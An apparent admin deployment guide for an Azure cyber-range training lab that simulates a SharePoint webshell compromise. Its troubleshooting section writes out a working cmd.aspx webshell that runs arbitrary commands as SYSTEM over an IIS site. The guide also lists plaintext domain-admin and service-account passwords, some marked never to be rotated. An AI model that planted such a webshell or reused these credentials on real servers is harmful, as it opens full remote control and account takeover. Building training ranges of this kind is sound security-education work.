# Admin Deployment Guide — OpenRaptor Cyber Range

This guide is for administrators deploying the OpenRaptor Cyber Range in a new Azure tenant.

> ## 🚀 Lab deployed by OD@CIRT.APAC?
>
> If OD@CIRT.APAC has deployed and handed over this lab environment to you, **your lab is ready — no setup required.**
>
> | Role | Go to |
> |------|-------|
> | 🧑‍💼 **Tenant Admin** | Jump to [Lab Administration — Per-Module Scripts](#lab-administration--per-module-scripts) — everything is pre-deployed, just run and reset modules |
> | 🎓 **Student** | [Student Lab Guide](lab-guide/01-sharepoint-webshell.md) — start your training directly |
>
> ⬇️ **Steps 1–8 below** are only needed if you are self-hosting and deploying the lab from scratch in your own Azure subscription.

---

## Prerequisites

### Azure Requirements
- Active Azure subscription with **Contributor** role (or Owner)
- Entra ID tenant with ability to register applications
- Sufficient quota in your target region:
  - At least **4 vCPUs** (Standard_B2s or equivalent)
  - **1 Bastion** deployment
  - **1 Public IP** (for Bastion only)

### Local Machine Requirements
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli) (`az` v2.50+)
- [Terraform](https://developer.hashicorp.com/terraform/install) (v1.5+)
- Git

### Licensing Requirements
- **Entra ID P1** (minimum) — for conditional access and risk-based sign-in logs
- **Microsoft 365 E3 or SharePoint Online Plan 2** — for SharePoint and unified audit log
- **MDE** — optional. If available, Microsoft Defender for Endpoint provides device-level telemetry and timeline analysis. Not required for core labs

---

---

## Credential Reference (Canonical)

> **Do not guess passwords. This table is the system of record. Updated: 2026-03-09**

| Class | Account(s) | Password | Notes |
|-------|-----------|----------|-------|
| Domain Admin | `NORCA\cirtadmin`, `NORCA\Administrator` | `CirtApacAdm!n2026` | Do not share with students |
| Student login | `NORCA\cirtstudent`, `cirtstudent@norca.click` | `CirtApacStudent2026` | Lab login for students |
| Scenario character | `NORCA\j.chen` | `CirtApacStudent2026` | Finance Analyst — compromised in scenario |
| **Service account** | `NORCA\svc-sp-farm` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
| **Service account** | `NORCA\svc-sp-app` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
| Handover encryption | _(7-Zip archive)_ | `CirtAPACR@ptor` | Standard handover zip password |

> ⚠️ Service accounts (`svc-sp-farm`, `svc-sp-app`) must use `Norca@2024!` — this is baked into the SP01 golden image. Using any other password will cause SharePoint services to fail on startup.


## Step 1 — Create a Service Principal

```bash
# Login to Azure
az login

# Set your subscription
az account set --subscription "<YOUR_SUBSCRIPTION_ID>"

# Create the service principal
az ad sp create-for-rbac \
  --name "sp-cirtlab-deploy" \
  --role Contributor \
  --scopes /subscriptions/<YOUR_SUBSCRIPTION_ID>
```

Save the output — you'll need it in Step 3:
```json
{
  "appId":       "YOUR_CLIENT_ID",
  "password":    "YOUR_CLIENT_SECRET",
  "tenant":      "YOUR_TENANT_ID"
}
```

> ⚠️ **Security:** Store the secret in Azure Key Vault or a secrets manager. Never commit it to Git.

---

## Step 2 — Clone the Repo

```bash
git clone https://github.com/<your-org>/OpenRaptor.git
cd OpenRaptor
```

---

## Step 3 — Configure Deployment Variables

Copy the example vars file and fill in your values:

```bash
cp infra-tf/terraform.tfvars.example infra-tf/terraform.tfvars
```

Edit `infra-tf/terraform.tfvars`:

```hcl
# Target Azure tenant and subscription
subscription_id = "YOUR_SUBSCRIPTION_ID"
location        = "australiaeast"        # Change to your preferred region

# Resource groups (names are customisable)
rg_network  = "rg-cirtlab-network"
rg_core     = "rg-cirtlab-core"
rg_attacker = "rg-cirtlab-attacker"
rg_policy   = "rg-cirtlab-policy"
rg_identity = "rg-cirtlab-identity"

# VM admin credentials
admin_username = "cirtadmin"
# admin_password set via environment variable — see below

# Golden image IDs — Community Gallery (provided by OD@CIRT.APAC out-of-band)
sp01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/sp01-module01-student/Versions/1.0.0"
dc01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/dc01-base-specialized/Versions/1.0.0"

# Kali post-deploy setup script (pull from OpenRaptor — public)
kali_setup_script_url = "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scenarios/module-01-webshell/admin/kali_01_setup.sh"

# Infrastructure
bastion_sku   = "Standard"
dns_zone_name = "norca.click"
vm_size       = "Standard_D2s_v3"

# SP01 private IP (snet-target-module01 = 10.10.3.0/24)
sp01_private_ip = "10.10.3.10"

# Tags applied to all resources
tags = {
  environment = "lab"
  module      = "shared"
  owner       = "cirt"
  blastRadius = "zero"
  ttl         = "2026-12-31"
}
```

Set your admin password as an environment variable (do not put it in the vars file):

```bash
# Bash
export TF_VAR_admin_password="CirtApacAdm!n2026"

# PowerShell
$env:TF_VAR_admin_password = "CirtApacAdm!n2026"
```

> ⚠️ **Never commit `terraform.tfvars` to Git.** It contains your subscription ID and is in `.gitignore` by default.

---

## Step 4 — Authenticate to Azure

Login with the service principal created in Step 1:

```bash
# Bash
az login --service-principal \
  --username  "$ARM_CLIENT_ID" \
  --password  "$ARM_CLIENT_SECRET" \
  --tenant    "$ARM_TENANT_ID"

# PowerShell
az login --service-principal `
  --username  $env:ARM_CLIENT_ID `
  --password  $env:ARM_CLIENT_SECRET `
  --tenant    $env:ARM_TENANT_ID

az account set --subscription "<YOUR_SUBSCRIPTION_ID>"
```

Or log in interactively if you have Owner/Contributor access:

```bash
az login
az account set --subscription "<YOUR_SUBSCRIPTION_ID>"
```

---

## Step 5 — Deploy Infrastructure (Terraform)

All infrastructure is deployed from the single `infra-tf/` directory. One `terraform apply` creates everything: networking, VMs, Bastion, Log Analytics, DNS, and policy.

```bash
cd infra-tf

# Initialise (downloads providers: azurerm ~>4.0, azapi ~>2.0)
terraform init

# Preview — review carefully before applying
terraform plan -out=tfplan

# Apply — takes approximately 10–20 minutes
terraform apply tfplan
```

Resources created:

| Module | Resources |
|--------|-----------|
| `network` | VNet `10.10.0.0/16`, 4 subnets, 4 NSGs |
| `bastion` | Azure Bastion Standard + Public IP |
| `logging` | Log Analytics Workspace (`law-cirtlab`) |
| `dns` | Private DNS zone `norca.click`, A records for DC01 + SP01 |
| `dc01` | DC01 VM from Community Gallery (`dc01-base-specialized`) at `10.10.1.10` |
| `sp01` | SP01 VM from Community Gallery (`sp01-module01-student`) at `10.10.3.10` |
| `kali01` | Kali Linux VM from Azure Marketplace at `10.10.2.10` |
| `policy` | Tag policy (audit mode) |
| `scripts-storage` | Storage account for lab scripts |

> ⏳ VM provisioning from golden images takes **5–10 minutes** per VM. Total deployment: **15–25 minutes**.

### Golden Images

| Image | VM | Source | Description |
|-------|-----|--------|-------------|
| `dc01-base-specialized` | DC01 | Community Gallery | Windows Server — AD DS, DNS, `norca.click` domain pre-configured |
| `sp01-module01-student` | SP01 | Community Gallery | SharePoint 2019 — **clean (noWS)**. Use for Module 01 student path |
| `sp01-module01` | SP01 | Community Gallery | SharePoint 2019 — **webShelled**. Reserved for future walk-in-compromised scenarios |
| _(Marketplace)_ | Kali01 | Azure Marketplace `kali-linux:kali:kali-2025-4` | Kali Linux — Marketplace terms prevent Community Gallery distribution |

> 📌 Community Gallery name (`<COMMUNITY_GALLERY_NAME>`) is provided by OD@CIRT.APAC directly to authorised deployers. It is not published in this repo.

---

## Step 5 (Alternative) — Manual Deployment via `az vm create`

If you prefer not to use Terraform, or need to redeploy individual VMs, use `az vm create` directly.

> **Prerequisites:** VNet, subnets, and NSGs must already exist. Deploy networking with Terraform first (`terraform apply -target module.network`), then use the commands below for VMs.

### DC01

```bash
# Bash
az vm create \
  --resource-group rg-cirtlab-core \
  --name dc01 \
  --image "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/dc01-base-specialized/Versions/1.0.0" \
  --size Standard_D2s_v3 \
  --admin-username cirtadmin \
  --admin-password "<YOUR_ADMIN_PASSWORD>" \
  --vnet-name vnet-cirtlab-base \
  --subnet snet-core \
  --private-ip-address 10.10.1.10 \
  --public-ip-address "" \
  --location australiaeast

# PowerShell
az vm create `
  --resource-group rg-cirtlab-core `
  --name dc01 `
  --image "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/dc01-base-specialized/Versions/1.0.0" `
  --size Standard_D2s_v3 `
  --admin-username cirtadmin `
  --admin-password "<YOUR_ADMIN_PASSWORD>" `
  --vnet-name vnet-cirtlab-base `
  --subnet snet-core `
  --private-ip-address 10.10.1.10 `
  --public-ip-address "" `
  --location australiaeast
```

### SP01 (Module 01 — noWS image)

```bash
# Bash
az vm create \
  --resource-group rg-cirtlab-core \
  --name win-norca-sp01 \
  --image "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/sp01-module01-student/Versions/1.0.0" \
  --size Standard_D2s_v3 \
  --admin-username cirtadmin \
  --admin-password "<YOUR_ADMIN_PASSWORD>" \
  --vnet-name vnet-cirtlab-base \
  --subnet snet-target-module01 \
  --private-ip-address 10.10.3.10 \
  --public-ip-address "" \
  --location australiaeast

# PowerShell
az vm create `
  --resource-group rg-cirtlab-core `
  --name win-norca-sp01 `
  --image "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/sp01-module01-student/Versions/1.0.0" `
  --size Standard_D2s_v3 `
  --admin-username cirtadmin `
  --admin-password "<YOUR_ADMIN_PASSWORD>" `
  --vnet-name vnet-cirtlab-base `
  --subnet snet-target-module01 `
  --private-ip-address 10.10.3.10 `
  --public-ip-address "" `
  --location australiaeast
```

### Kali01 (Marketplace)

```bash
# Accept Marketplace terms first (one-time per subscription)
az vm image terms accept \
  --publisher kali-linux \
  --offer kali \
  --plan kali-2025-4

# Bash
az vm create \
  --resource-group rg-cirtlab-attacker \
  --name kali01 \
  --image "kali-linux:kali:kali-2025-4:latest" \
  --size Standard_D2s_v3 \
  --admin-username cirtadmin \
  --admin-password "<YOUR_ADMIN_PASSWORD>" \
  --vnet-name vnet-cirtlab-base \
  --subnet snet-attacker \
  --private-ip-address 10.10.2.10 \
  --public-ip-address "" \
  --location australiaeast

# PowerShell
az vm create `
  --resource-group rg-cirtlab-attacker `
  --name kali01 `
  --image "kali-linux:kali:kali-2025-4:latest" `
  --size Standard_D2s_v3 `
  --admin-username cirtadmin `
  --admin-password "<YOUR_ADMIN_PASSWORD>" `
  --vnet-name vnet-cirtlab-base `
  --subnet snet-attacker `
  --private-ip-address 10.10.2.10 `
  --public-ip-address "" `
  --location australiaeast
```

---

## Step 6 — Post-Deploy: SharePoint Service Accounts

After DC01 and SP01 are running, verify SharePoint services start correctly. The golden image has `svc-sp-farm` and `svc-sp-app` baked with password `Norca@2024!`.

Connect to SP01 via Bastion and run:

```powershell
# On SP01 — verify SharePoint services are running
Get-Service | Where-Object { $_.Name -like "SP*" } | Select Name, Status

# If services are stopped, reset service account credentials:
$svcPass = "Norca@2024!"
sc.exe config SPTimerV4  obj= "NORCA\svc-sp-farm" password= $svcPass
sc.exe config SPWriterV4 obj= "NORCA\svc-sp-farm" password= $svcPass
sc.exe config SPAdminV4  obj= "NORCA\svc-sp-farm" password= $svcPass
net start SPTimerV4
```

> ⚠️ **`svc-sp-farm` and `svc-sp-app` passwords are permanently `Norca@2024!`** — baked into the golden image. Do not change or rotate these. See [Credential Reference](#credential-reference-canonical).

---

## Step 7 — Lab Module Setup

After all VMs are running, stage the scenario toolkit for Module 01. Run this from DC01:

```powershell
# On DC01 — stage Module 01 toolkit
# Downloads from OpenRaptor, stages on Kali01, seeds j.chen account
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scripts/lab_01_setup.ps1" -OutFile "C:\lab_01_setup.ps1"
.\lab_01_setup.ps1
```

Expected output:
```
[OK] DC01 reachable
[OK] SP01 reachable — HTTP 200 on http://sharepoint.norca.click
[OK] j.chen account created (or already exists)
[OK] Kali01 toolkit staged at /opt/raptor/lab-01/
[OK] SP01 in clean state (no webshell present)
--- Lab 01 setup: READY ---
```

> Run once after initial deployment. Not required after SP01-only resets (`lab_01_reset.ps1` handles SP01 state automatically).

---

## Step 8 — Configure Student Access

### Create Student Account

```bash
# Azure CLI — create cirtstudent in on-prem AD via DC01 (Bastion session on DC01)
New-ADUser -Name "cirtstudent" `
  -UserPrincipalName "cirtstudent@norca.click" `
  -AccountPassword (ConvertTo-SecureString "CirtApacStudent2026" -AsPlainText -Force) `
  -PasswordNeverExpires $true `
  -Enabled $true
```

### Assign Log Analytics Reader Role

```bash
# Bash
az role assignment create \
  --assignee "cirtstudent@norca.click" \
  --role "Log Analytics Reader" \
  --scope /subscriptions/<YOUR_SUBSCRIPTION_ID>/resourceGroups/rg-cirtlab-core

# PowerShell
az role assignment create `
  --assignee "cirtstudent@norca.click" `
  --role "Log Analytics Reader" `
  --scope /subscriptions/<YOUR_SUBSCRIPTION_ID>/resourceGroups/rg-cirtlab-core
```

### Share Bastion Access

Students connect via Azure Bastion — no public IPs, no VPN required:

1. Azure Portal → Resource Group `rg-cirtlab-core`
2. Select `win-norca-sp01` → **Connect** → **Bastion**
3. Provide credentials from your lab handover document

> 💡 Pin a Portal dashboard with direct Bastion links to each VM and the Log Analytics Workspace for student convenience.

## Cost Management

### Estimated Monthly Cost (australiaeast, all VMs running 8h/day)

| Resource | Est. Cost/month |
|---|---|
| DC01 (Standard_B2s) | ~$30 |
| SP01 (Standard_B4ms) | ~$60 |
| Kali01 (Standard_B2s) | ~$30 |
| Azure Bastion (Basic) | ~$140 |
| Log Analytics (5GB/day) | ~$15 |
| **Total** | **~$275/month** |

> Costs vary by region and usage. Bastion is the biggest cost driver — consider [Bastion Developer SKU](https://learn.microsoft.com/azure/bastion/quickstart-developer) to reduce costs.

### Auto-Shutdown
All VMs are configured to shut down at `19:00 UTC` daily. Override in `terraform.tfvars`.

### Destroy the Lab
```bash
cd infra-tf

# Bash
terraform destroy -auto-approve

# PowerShell
terraform destroy -auto-approve
```

> ⚠️ This destroys **all** lab resources — VMs, networking, Bastion, Log Analytics. Golden images in the Community Gallery are **not** deleted (they live in the source subscription). You can redeploy at any time.

---

## Troubleshooting

### SP01 SharePoint not responding after reboot

If SP01 becomes unresponsive after a reboot, use the reset script to rebuild from the golden image:

```powershell
# On DC01 as Domain Admin
.\scenarios\module-01-webshell\admin\lab_01_reset.ps1
```

See the **Recovery Plan** section for manual rebuild steps if Terraform is unavailable.

### SP01 can't join domain
```powershell
# Verify DNS points to DC01
Set-DnsClientServerAddress -InterfaceAlias "Ethernet*" -ServerAddresses "10.10.1.10"

# Test connectivity
Test-NetConnection -ComputerName 10.10.1.10 -Port 389

# Attempt rejoin
$cred = Get-Credential  # DOMAIN\cirtadmin
Add-Computer -DomainName "{{DOMAIN}}" -Credential $cred -Force -Restart
```

### ShellSite (port 8080) returns 500.19 or connection refused
The lab setup script creates a **local IIS site** (`ShellSite`) on port **8080** with a minimal `cmd.aspx` webshell in `C:\inetpub\shell`. This is **admin-only** and used to validate local command execution during lab setup.

If you hit **HTTP 500.19** (`0x80070003`) or can’t connect:

```powershell
# Recreate folder + minimal web.config
New-Item -ItemType Directory -Force -Path C:\inetpub\shell | Out-Null
@"<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent/>
  </system.webServer>
</configuration>
"@ | Out-File -FilePath "C:\inetpub\shell\web.config" -Encoding UTF8

# Recreate cmd.aspx
@"<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
"@ | Out-File -FilePath "C:\inetpub\shell\cmd.aspx" -Encoding UTF8

# Ensure IIS site + app pool
$appcmd = "$env:windir\System32\inetsrv\appcmd.exe"
& $appcmd add apppool /name:"ShellPool" /managedRuntimeVersion:"v4.0" /processModel.identityType:LocalSystem /startMode:AlwaysRunning
& $appcmd add site /name:"ShellSite" /bindings:"http/*:8080:" /physicalPath:"C:\inetpub\shell"
& $appcmd set app "ShellSite/" /applicationPool:"ShellPool"
& $appcmd start site "ShellSite"
```

Verify:
```powershell
curl.exe http://localhost:8080/cmd.aspx?cmd=whoami
```
Expected output: `nt authority\\system`.

### Log Analytics not receiving data
- Check VM extensions are installed: Portal → VM → Extensions
- Verify NSG allows outbound 443 from monitoring subnet
- Check Log Analytics workspace pricing tier is not free (500MB cap)

### Bastion connection fails
- Verify Bastion is in `AzureBastionSubnet` (exact name required)
- Check NSG on Bastion subnet allows inbound 443 from Internet
- Confirm VM is running (not deallocated)

---

---

## Lab Administration — Per-Module Scripts

Every module ships **three admin scripts** (run from DC01) and **one student script** (run from Kali01).

### Script Model

| Script | Who | Where | Purpose |
|--------|-----|--------|---------|
| `admin/lab_NN_setup.ps1` | Admin | DC01 | First-time setup: create AD accounts, stage toolkit on Kali |
| `admin/lab_NN_check.ps1` | Admin | DC01 | Pre-flight: verify lab is ready before handing to student |
| `admin/lab_NN_reset.ps1` | Admin | DC01 | Reset: rebuild VM(s) from golden image between students |
| `student/check-lab-NN.sh` | Student | Kali01 | Student preflight: confirm environment is ready before starting |

> ⚠️ **All admin scripts run from DC01 as Domain Admin.** Never run reset scripts from the management workstation.

---

### Module 01 — SharePoint Webshell (`lab_01_sp_webshell`)

**Before first student (or after new deployment):**
```powershell
# On DC01, as Domain Admin
.\scenarios\module-01-webshell\admin\lab_01_setup.ps1
```
Creates j.chen account, deploys webshell IIS site on SP01, stages toolkit on Kali.

> ⚠️ **IIS setup uses appcmd.exe — do NOT use `Import-Module WebAdministration` via `az run-command`.**
> `az vm run-command` spawns a 32-bit WOW64 PowerShell process. WebAdministration cmdlets in that context
> write to `C:\Windows\SysWOW64\inetsrv\config\applicationHost.config` — **not** the real IIS config at
> `System32\inetsrv\config\`. IIS never reads the WOW64 copy, so the site/pool never appears.
> `lab_01_setup.ps1` calls `sp01-webshell-setup.ps1` which uses `appcmd.exe` directly — this always
> writes to the correct config. If you need to rebuild the webshell site manually, run
> `sp01-webshell-setup.ps1` directly on SP01 (RDP or appcmd via run-command).

**Verify lab is ready:**
```powershell
.\scenarios\module-01-webshell\admin\lab_01_check.ps1
```
Checks DC01, SP01 (:80 + :8080 webshell), j.chen auth, Kali toolkit, clean state.

**Reset between students:**
```powershell
.\scenarios\module-01-webshell\admin\lab_01_reset.ps1
```
Rebuilds SP01 from **`sp01-module01-student` (noWS)** golden image, then re-runs setup. Reset time: ~12 minutes.

**Student preflight (student runs from Kali01):**
```bash
bash /opt/raptor/lab-01/check-lab-01.sh
```
All checks must pass (exit 0) before student proceeds.

---

### Golden Image Reference — SP01

| Image | Use case |
|-------|----------|
| `sp01-module01-student` | **noWS — Module 01 default.** Student drops webshell themselves from Kali. |
| `sp01-module01` | **webShelled — future modules.** Investigation starts from already-compromised state. |

> The reset script for Module 01 always rebuilds from `sp01-module01-student`. Never substitute the webShelled image for the student path.

---

### Adding Scripts for New Modules

As new modules are added, follow the same 3+1 pattern:

```
scenarios/
└── module-02-bec/
    ├── admin/
    │   ├── lab_02_setup.ps1
    │   ├── lab_02_check.ps1
    │   └── lab_02_reset.ps1
    └── student/
        └── check-lab-02.sh
```

Each admin set must:
1. Seed required AD accounts / M365 data
2. Stage attack toolkit on Kali from OpenRaptor
3. Rebuild only VMs affected by that module
4. Confirm clean state before handing to student

---

## Recovery Plan — Unrecoverable VMs

Use this plan if a VM crashes and cannot be recovered by a normal restart.

### Recovery Priority

| VM | Rebuild Trigger | Impact if Down |
|---|---|---|
| SP01 | Student reset OR unrecoverable crash | Scenario unavailable — rebuild is normal ops |
| DC01 | Only if unrecoverable (AD corruption, OS failure) | All VMs lose domain auth — lab fully down |
| Kali | Only if unrecoverable | Attack simulation unavailable only |
| Base infra | Extreme case only | Full lab destruction |

---

### SP01 — Rebuild (Normal)

SP01 is designed to be rebuilt. This is the standard student reset flow.

```bash
./scripts/reset-lab.sh
```

If Terraform fails, manual rebuild:
```bash
cd infra
terraform destroy -target module.sp01 -auto-approve
terraform apply -target module.sp01 -auto-approve
```

---

### DC01 — Emergency Rebuild

> ⚠️ Rebuilding DC01 destroys Active Directory. All domain-joined VMs (SP01, Kali) will lose domain membership and need to be rebuilt too.

**Step 1 — Attempt recovery first:**
```bash
# Try a restart
az vm restart -g <YOUR_RESOURCE_GROUP> -n dc01

# Check AD DS service
az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
  --command-id RunPowerShellScript \
  --scripts "Get-Service NTDS,DNS,Netlogon | Select Name,Status"
```

**Step 2 — If unrecoverable, full rebuild:**
```bash
cd infra

# Destroy SP01 first (depends on DC)
terraform destroy -target module.sp01 -auto-approve
terraform destroy -target module.dc01 -auto-approve

# Rebuild DC01 (AD DS setup takes ~20 min)
terraform apply -target module.dc01 -auto-approve

# Wait for DC to be ready, then rebuild SP01
sleep 600
terraform apply -target module.sp01 -auto-approve
```

**Step 3 — Verify AD DS:**
```bash
az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
  --command-id RunPowerShellScript \
  --scripts "
Get-Service NTDS,DNS,Netlogon | Select Name,Status
(Get-ADDomain).DNSRoot
Get-ADUser -Filter * | Measure-Object | Select Count
"
```

---

### Kali — Emergency Rebuild

Kali is deployed from **Azure Marketplace** (not Community Gallery — Marketplace terms prevent redistribution). Rebuild is safe at any time — no persistent state.

```bash
# Delete the existing Kali VM
az vm delete --resource-group <YOUR_RESOURCE_GROUP> --name kali01 --yes

# Accept Marketplace terms (if not already done)
az vm image terms accept --publisher kali-linux --offer kali-linux --plan kali

# Redeploy from Marketplace
az vm create \
  --resource-group <YOUR_RESOURCE_GROUP> \
  --name kali01 \
  --image "kali-linux:kali:kali-2025-4:latest" \
  --size Standard_D2s_v3 \
  --admin-username azureuser \
  --admin-password "<YOUR_ADMIN_PASSWORD>" \
  --vnet-name vnet-cirtlab \
  --subnet subnet-kali \
  --public-ip-address "" \
  --location <YOUR_REGION>
```

> After rebuild, run `lab_NN_setup.ps1` for the active module — this re-stages the module toolkit from OpenRaptor to `/opt/raptor/lab-NN/`.

**Kali post-deploy setup (automated via `lab_NN_setup.ps1`):**
- Installs: `curl`, `nmap`, `impacket`, `crackmapexec`, `evil-winrm`, `responder`
- Creates `/opt/raptor/` directory structure
- Pulls module scripts from OpenRaptor
- Network pre-configured for lab VNet (`10.10.3.x` subnet)

---

### Full Lab Rebuild (Extreme Case)

> ⚠️ Destroys everything. All student progress is lost. Only use if the resource group is in an unrecoverable state.

```bash
cd infra
terraform destroy -auto-approve
terraform apply -auto-approve
```

Full rebuild: ~45–60 minutes.

---

### Post-Rebuild Checklist

- [ ] DC01 — AD DS, DNS, Netlogon services running
- [ ] SP01 — domain joined, HTTP 200, all SP services running
- [ ] Kali (if rebuilt) — tools present, network connectivity
- [ ] LAW receiving heartbeats from all VMs
- [ ] Run `./scripts/reset-lab.sh` smoke test passes

---

## Security Notes

- No VMs have public IP addresses — all access via Bastion only
- Azure Policy denies public IP creation in `<YOUR_RESOURCE_GROUP>`
- All simulations are **benign** — no real malware, no live exploits
- Do not connect this lab to production systems
- Rotate admin credentials after initial setup

---

## Support

For issues, open a GitHub issue at [<your-org>/OpenRaptor](https://github.com/<your-org>/OpenRaptor/issues).

---

_Last updated: 2026-03-09_
